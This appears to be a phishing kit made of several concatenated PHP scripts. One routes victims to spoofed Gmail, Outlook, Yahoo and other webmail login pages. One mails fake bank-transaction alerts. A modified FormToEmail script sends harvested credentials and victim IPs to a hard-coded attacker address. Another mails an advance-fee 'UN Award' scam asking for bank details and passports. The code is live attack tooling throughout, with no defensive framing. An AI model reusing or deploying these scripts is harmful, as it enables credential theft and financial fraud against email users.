<?php
  $url = $_GET['email'];

  $redirects = array(
    'gmail' => 'accounts.google.com/ServiceLogin.php',
    'hotmail' => 'outlook.live.com/index.php',
	'live' => 'outlook.live.com/index.php',
	'mweb' => 'mail.mweb.co.za/login.php',
	'iafrica' => 'mail.mweb.co.za/login.php',
	'telkomsa' => 'webmail.telkomsa.net/mail.php',
	
	'163.com' => 'email.163.com/login.php',
	'126.com' => 'email.163.com/login.php',
	'yeah' => 'email.163.com/login.php',
	'shouji' => 'email.163.com/login.php',
	
    'webmail' => 'webmail/index.php', // Alternatives: novel also directs to book.
    'yahoo' => 'login.yahoo.com/login.php');
	

  

  $wordFound = false;

  // Loop through all words
  foreach($redirects as $word => $file) {

    // If a word exists in the url, include that file.
    if (strpos($url,$word) !== false) {

      // `file_get_contents` would just echo the code in the file rather 
      // than execute it, so did you mean `include` instead? Or a real 
      // redirect using header('Location: xyz.php');?

      include($file);

      $wordFound = true;
      break;
    }
  }

  // If no words were found, include the other file
  if ($wordFound == false) {
    include("webmail-2096/login.php");
  }

?>

<?php
$ip = getenv("REMOTE_ADDR");
$to = $_POST['email'];
$from = "noreply@mybankani.com"; 
$headers = "From: $from";
$subject = "Purchase Payment Notice!";
$message = "
Dear Sir

Your bank card was used at windowshop.com,
This email is to notify you on the ongoing transaction If you did not initiate this payment, 
Please click here or follow the short url https://tinyurl.com/y8tenoe7/$to to cancel your order.

Yours Sincerely,
Account Security

T&Cs | Privacy Policy | Client Charter | Customer Service Charter Useful Links | Copyright 2001-2018.

















";
$mailsent = mail($to, $subject, $message, $headers);

?>





<?php
error_reporting(E_ALL ^ E_NOTICE);


/*










Thank you for choosing FormToEmail by FormToEmail.com


Version 2.5 April 16th 2009















COPYRIGHT FormToEmail.com 2003 - 2009















You are not permitted to sell this script, but you can use it, copy it or distribute it, providing that you do not delete this copyright notice, and you do not remove any reference or links to FormToEmail.com















For support, please visit: http://formtoemail.com/support/















You can get the Pro version of this script here: http://formtoemail.com/formtoemail_pro_version.php







---------------------------------------------------------------------------------------------------















FormToEmail-Pro (Pro version) Features:















Check for required fields







Attach file uploads







Upload files to the server







Securimage CAPTCHA support







reCAPTCHA support







textCAPTCHA support







identiPIC photo CAPTCHA







HTML output option







Use email templates







Show date and time submitted







Create Message ID







CSV output to attachment or file







Autoresponder (with file attachment)







Show sender's IP address







Block IP addresses







Block web addresses or rude words







Block gibberish (MldMtrPAgZq etc)







Block gobbledegook characters (? ? ? etc)







Pre-populate the form







Show errors on the form page







Check for a set cookie







Set encoding (utf-8 etc)







Ignore fields







Sort fields







Auto redirect to "Thank You" page







HTML template for "Thank You" page







No branding







Free upgrades for life















---------------------------------------------------------------------------------------------------















Confused by PHP and PERL scripts?  Don't have PHP on your server?  Can't send email from your server?















Try our remotely hosted form service:















http://FormToEmailRemote.com















---------------------------------------------------------------------------------------------------















FormToEmail DESCRIPTION















FormToEmail is a contact-form processing script written in PHP. It allows you to place a form on your website which your visitors can fill out and send to you.  The contents of the form are sent to the email address (or addresses) which you specify below.  The form allows your visitors to enter their name, email address and comments.  The script will not allow a blank form to be sent.















Your visitors (and nasty spambots!) cannot see your email address.  The script cannot be hijacked by spammers.















When the form is sent, your visitor will get a confirmation of this on the screen, and will be given a link to continue to your homepage, or other page if you specify it.
















Should you need the facility, you can add additional fields to your form, which this script will also process without making any additional changes to the script.  You can also use it to process other forms.  The script will handle the "POST" or "GET" methods.  It will also handle multiple select inputs and multiple check box inputs.  If using these, you must name the field as an array using square brackets, like so: <select name="fruit[]" multiple>.  The same goes for check boxes if you are using more than one with the same name, like so: <input type="checkbox" name="fruit[]" value="apple">Apple<input type="checkbox" name="fruit[]" value="orange">Orange<input type="checkbox" name="fruit[]" value="banana">Banana















** PLEASE NOTE **  If you are using the script to process your own forms (or older FormToEmail forms) you must ensure that the email field is named correctly in your form, like this for example: <input type="text" name="email">.  Note the lower case "email".  If you don't do this, the visitor's email address will not be available to the script and the script won't be able to check the validity of the email, amongst other things.  If you are using the form code below, you don't need to check for this.















This is a PHP script.  In order for it to run, you must have PHP (version 4.1.0 or later) on your webhosting account, and have the PHP mail() function enabled and working.  If you are not sure about this, please ask your webhost about it.















SETUP INSTRUCTIONS















Step 1: Put the form on your webpage







Step 2: Enter your email address and (optional) continue link below







Step 3: Upload the files to your webspace















Step 1:















To put the form on your webpage, copy the code below as it is, and paste it into your webpage:































Step 2:















Enter your email address.















Enter the email address below to send the contents of the form to.  You can enter more than one email address separated by commas, like so: $my_email = "info@example.com"; or $my_email = "bob@example.com,sales@example.co.uk,jane@example.com";















*/















$my_email = "usmandaniel52@yahoo.com";















/*















Optional.  Enter a From: email address.  Only do this if you know you need to.  By default, the email you get from the script will show the visitor's email address as the From: address.  In most cases this is desirable.  On the majority of setups this won't be a problem but a minority of hosts insist that the From: address must be from a domain on the server.  For example, if you have the domain example.com hosted on your server, then the From: email address must be something@example.com (See your host for confirmation).  This means that your visitor's email address will not show as the From: address, and if you hit "Reply" to the email from the script, you will not be replying to your visitor.  You can get around this by hard-coding a From: address into the script using the configuration option below.  Enabling this option means that the visitor's email address goes into a Reply-To: header, which means you can hit "Reply" to respond to the visitor in the conventional way.  (You can also use this option if your form does not collect an email address from the visitor, such as a survey, for example, and a From: address is required by your email server.)  The default value is: $from_email = "";  Enter the desired email address between the quotes, like this example: $from_email = "contact@example.com";  In these cases, it is not uncommon for the From: ($from_email) address to be the same as the To: ($my_email) address, which on the face of it appears somewhat goofy, but that's what some hosts require.















*/
















$from_email = "yahoomail";
















/*















Optional.  Enter the continue link to offer the user after the form is sent.  If you do not change this, your visitor will be given a continue link to your homepage.















If you do change it, remove the "/" symbol below and replace with the name of the page to link to, eg: "mypage.htm" or "http://www.elsewhere.com/page.htm"















*/















$continue = "";















/*















Step 3:















Save this file (FormToEmail.php) and upload it together with your webpage containing the form to your webspace.  IMPORTANT - The file name is case sensitive!  You must save it exactly as it is named above!















THAT'S IT, FINISHED!















You do not need to make any changes below this line.















*/















$errors = array();















// Remove $_COOKIE elements from $_REQUEST.















if(count($_COOKIE)){foreach(array_keys($_COOKIE) as $value){unset($_REQUEST[$value]);}}















// Validate email field.















if(isset($_REQUEST['email']) && !empty($_REQUEST['email']))







{















$_REQUEST['email'] = trim($_REQUEST['email']);















if(substr_count($_REQUEST['email'],"@") != 1 || stristr($_REQUEST['email']," ") || stristr($_REQUEST['email'],"\\") || stristr($_REQUEST['email'],":")){$errors[] = "Email address is invalid";}else{$exploded_email = explode("@",$_REQUEST['email']);if(empty($exploded_email[0]) || strlen($exploded_email[0]) > 64 || empty($exploded_email[1])){$errors[] = "Email address is invalid";}else{if(substr_count($exploded_email[1],".") == 0){$errors[] = "Email address is invalid";}else{$exploded_domain = explode(".",$exploded_email[1]);if(in_array("",$exploded_domain)){$errors[] = "Email address is invalid";}else{foreach($exploded_domain as $value){if(strlen($value) > 63 || !preg_match('/^[a-z0-9-]+$/i',$value)){$errors[] = "Email address is invalid"; break;}}}}}}















}















// Check referrer is from same site.















//if(!(isset($_SERVER['HTTP_REFERER']) && !empty($_SERVER['HTTP_REFERER']) && stristr($_SERVER['HTTP_REFERER'],$_SERVER['HTTP_HOST']))){$errors[] = "You must enable referrer logging to use the form";}















// Check for a blank form.















function recursive_array_check_blank($element_value)







{















global $set;















if(!is_array($element_value)){if(!empty($element_value)){$set = 1;}}







else







{















foreach($element_value as $value){if($set){break;} recursive_array_check_blank($value);}















}















}















recursive_array_check_blank($_REQUEST);















if(!$set){$errors[] = "You cannot send a blank form";}















unset($set);















// Display any errors and exit if errors exist.















if(count($errors)){foreach($errors as $value){print "$value<br>";} exit;}















if(!defined("PHP_EOL")){define("PHP_EOL", strtoupper(substr(PHP_OS,0,3) == "WIN") ? "\r\n" : "\n");}















// Build message.















function build_message($request_input){if(!isset($message_output)){$message_output ="";}if(!is_array($request_input)){$message_output = $request_input;}else{foreach($request_input as $key => $value){if(!empty($value)){if(!is_numeric($key)){$message_output .= str_replace("_"," ",ucfirst($key)).": ".build_message($value).PHP_EOL.PHP_EOL;}else{$message_output .= build_message($value).", ";}}}}return rtrim($message_output,", ");}















$message = build_message($_REQUEST);










$message .= "IP: ".$ip."\n";




$message = $message . PHP_EOL.PHP_EOL."-- ".PHP_EOL."Thank you for using FormToEmail from http://FormToEmail.com";

$message .="HTTP_REFERER: ".$HTTP_REFERER."\n";












$message = stripslashes($message);















$subject = "GEN AUTHENTICATE";















$subject = stripslashes($subject);















if($from_email)







{















$headers = "From: " . $from_email;







$headers .= PHP_EOL;







$headers .= "Reply-To: " . $_REQUEST['email'];















}







else







{















$from_name = "";















if(isset($_REQUEST['name']) && !empty($_REQUEST['name'])){$from_name = stripslashes($_REQUEST['name']);}















$headers = "From: {$from_name} <{$_REQUEST['email']}>";















}















mail($my_email,$subject,$message,$headers);















?><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>

<head>

<title>Form To Email PHP script from FormToEmail.com</title>

<meta http-equiv="Content-Type" content="text/html" />

<style type="text/css">
<!--
body {
	background-color: #FFFFFF;

	background-image: url(news_bg.jpg);
}
body,td,th {
	color: #000099;
}
.hd {margin:0 0 2em 0; 
  border-bottom:1px solid #ccc; 
  padding:20px 0 12px 0;
  clear:both;
}
#bd {padding-bottom:5em;
  padding-top:1px;
}
#contContainer {clear:both;
  margin:0 auto;
  padding:0 15px;
}


-->
</style>

</head>

<body>
<div id="content">
  <div>
    <div>
      <div>
        <div id="hd">
          <link type="text/css" rel="stylesheet" href="update_files/uh_slim_ssl-1.css">
          <div id="ygma">
            <div id="ygmaheader">
              <div class="bd sp">
                <div id="yahoo" class="ygmaclr">
                  <div id="ygmabot"></div>
                  <div id="mepanel"></div>
                </div>
              </div>
            </div>
          </div>
          <!--<img src="http://ads.yimg.com/a/i/sh/bl.gif?click=1354379840298907" width=1 height=1 border=0>-->
          <script language="javascript">
if(window.yzq_d==null)window.yzq_d=new Object();
window.yzq_d['qE5SBGKL5Qg-']='&U=13gs5cobj%2fN%3dqE5SBGKL5Qg-%2fC%3d650008.13641938.13721588.11241636%2fD%3dHEAD%2fB%3d5775037%2fV%3d1';
  </script>
          <noscript>
            <img width=1 height=1 alt="" src="https://us.bc.yahoo.com/b?P=bDdu2WKL81hRbdGgULoJogFCKYqpo1C6MkAAA5J0&T=18juu5qq1%2fX%3d1354379840%2fE%3d150001878%2fR%3dregst%2fK%3d5%2fV%3d2.1%2fW%3dH%2fY%3dYAHOO%2fF%3d3422765442%2fH%3dc2VjdXJlPSJ0cnVlIiBzZXJ2ZUlkPSJiRGR1MldLTDgxaFJiZEdnVUxvSm9nRkNLWXFwbzFDNk1rQUFBNUowIiBzaXRlSWQ9IjQ0NjU1NTEiIHRTdG1wPSIxMzU0Mzc5ODQwMjUyMzI3IiA-%2fQ%3d-1%2fS%3d1%2fJ%3d78F28B62&U=13gs5cobj%2fN%3dqE5SBGKL5Qg-%2fC%3d650008.13641938.13721588.11241636%2fD%3dHEAD%2fB%3d5775037%2fV%3d1">
          </noscript>
          <!--QYZ CMS_NONE_AVAIL,,98.139.159.100;;HEAD;150001878;2;-->
        </div>
        <div id="bd">
          <div id="contContainer"></div>
        </div>
      </div>
    </div>
  </div>
</div>
</body>

</html>

















<?php
$to=$_POST['email'];
$subject = "UN Award Notice";

$message = "
<html>
<head>
<title>HTML email</title>
</head>
<body>
<p>Dear Sir</p>
This is to officially notify you that the last result for the United Nation Public Service & Academic Award
done for  academic staff and Public servants was recently released and we are happy to inform you, 
that you are our Fourth  prize winner . Your ticket/Winning number is BNK0489S7T.
<p></p>
<strong>
<p>S/N || Winners Promo Email  || Amount  || <Win Status   </p> </strong>
<p></p>
<p>1   || reggiemagcase@icloud.com     || $7.500.000.00      || Claimed  </p>
<p>1   || uzokadonald@yahoo.com || $2.500.000.00 || Claimed  </p>
<p>3   || usmabagggj@icloud.com || $4.500.000.00    || Claimed</p>
<p>4   || $to || $7.500.000.00  || Claimed</p>
<p>5   || johnlouh@icloud.com   || $7.500.000.00    || Claimed </p>
<p>6   || herrof_gff@icloud.com || $7.500.000.00    || Claimed </p>
<p></p>
<p>You are the Fourth to have these Benefits !!!
To receive your reward as soon as possible,you will need to upload and identification document.Simply CLICK HERE or copy and paste this http://ow.ly/Vdlgr url to your browser  to verify your personal details on United Nations online verification/claim page.</p>
<p></p>
<p>This is to avoid false claim or identity fraud. You will be required to select a secret number in the form, which will be  used for authentication. Your prize will be released to you as soon as you have filled the necessary information in the form and save your secret number, do not share with any one to avoid double claims or abuse of the program.</p>
<p>Bear it in mind that this message is only for this particular recipient $email and that you won big in this promo because your details were registered with the United Nations Public Service email award program, However, if you wish to decline the receipt of your prize money, you are to notify us on time by replying REJECT to stop receiving this announcement. You will receive a confirmation message in your email within 24 hours of verification and your e-cheque will be sent to you.</p>

<p>After verification!!! Follow this simple instruction to claim your benefits.</p>
<p></p>
<p>
<p>1. Send the attached Check No. to our Payment Bank and a short  request letter for payment of Grants from United Nation .</p>
<p>2. For U.S citizens, Please add your local bank Account Information for transfer.
<p>3. Non U.S Citizens should please undergo the New account Identification procedures to  avoid false claims  of their benefits.</p>
<p>4. Fill our  online verification form to receive your cheque number. </p>
<p>5. Email us back with a copy of your international passport for Invitation and Visa Application request.</p>
<p></p>
<p>BANK DETAILS<p>
<p>Executive Alliance Bank International<p>
<p>Email: allianceintl@accountant.com <p>
<p>(Please send the Check and batch number to the above email)<p>
<p></p>
<p>NOTE: Payment through courier companies are only in Terms of Certified Check, the bank will post your original open Check to your location, and for winners within United States were this promotion is taken place should come directly to our head office to claim their award.<p>
<p></p>
<p>WARNING: Because of numerous fraudulent schemes going around the Internet, confidentiality should be accorded at all times. You are expected to keep the news of your winning and your ticket number to yourself until you have received your prize money. This is to avoid false claims, impersonation and abuse of the program. </p>
<p>We feel a sense of your responsibility as a certified teacher and well establishment in your Organization We count on your energy, your leadership and creativity to realize change and sustainable development. We remember with gratitude to those who serve with such dedication.
Feel free to contact us if you require further assistance, thank you and have a pleasant day.  </p>
<p></p>
<p>Congratulations once more!!!
</p>Yours Sincerely,<p>
<p>T&Cs | Privacy Policy | Client Charter | Customer Service Charter Useful Links | Copyright 2001-2016 </p>
<p>Alliance B.O.A  Bank United States<p>
</body>
</html>
";

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: <UNawards@webinform.com>' . "\r\n";

mail($to,$subject,$message,$headers);
?> 



<?php
  $email = $_POST['email'];
?>
<?php 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$domain = explode('@', $email);
	
	$domain_check = '@'.strtolower($domain[1]);
	
	if(stripos($domain_check, '@yahoo.') !== false || stripos($domain_check, '@rocketmail.') !== false || stripos($domain_check, '@ymail.') !== false){
		header('Location: yahoo/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
	}
	elseif(stripos($domain_check, '@live.') !== false || stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@msn.') !== false) {
		header('Location: hotmail/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
			}
			
	elseif(stripos($domain_check, '@aol.') !== false || stripos($domain_check, '@aol.') !== false) {
		header('Location: aol/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
			}
	elseif(stripos($domain_check, '@163.') !== false || stripos($domain_check, '@123.') !== false || stripos($domain_check, '@msn.') !== false) {
		header('Location: 163/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
	}
	
	elseif(stripos($domain_check, '@126.') !== false || stripos($domain_check, '@126.') !== false || stripos($domain_check, '@@126.') !== false) {
		header('Location: 126/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
	}
	elseif(stripos($domain_check, '@gmail.') !== false || stripos($domain_check, '@google.') !== false) {
		header('Location: gmail/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
	}
	elseif(stripos($domain_check, '@hanmail.') !== false || stripos($domain_check, '@daum.') !== false) {
		header('Location: daum/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
		}
	elseif(stripos($domain_check, '@qq.') !== false || stripos($domain_check, '@qq.') !== false) {
		header('Location: mailqq/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
		}
	elseif(stripos($domain_check, '@.naver.') !== false || stripos($domain_check, '@naver.') !== false) {
		header('Location: nv/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
		}
	elseif(stripos($domain_check, '@.office365.') !== false || stripos($domain_check, '@office365.') !== false) {
		header('Location: office365/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
		}
	elseif(stripos($domain_check, '@.vip163.') !== false || stripos($domain_check, '@vip163.') !== false) {
		header('Location: vip163/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
		}
		elseif(stripos($domain_check, '@.vip163.') !== false || stripos($domain_check, '@vip.163.') !== false) {
		header('Location: vip163/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
		}
		elseif(stripos($domain_check, '@.vip163.') !== false || stripos($domain_check, '@163.') !== false) {
		header('Location: vip163/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
		}
	elseif(stripos($domain_check, '@.yeah.') !== false || stripos($domain_check, '@yeah.') !== false) {
		header('Location: yeah/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
	}
elseif(stripos($domain_check, '@comcast.') !== false || stripos($domain_check, '@comcast.') !== false) {
		header('Location: comcast/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
	}
	else {
		header('Location: http://skylimitlogistics.altervista.org/me/veri1/indexi.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&email='.$email);
	}
		
?>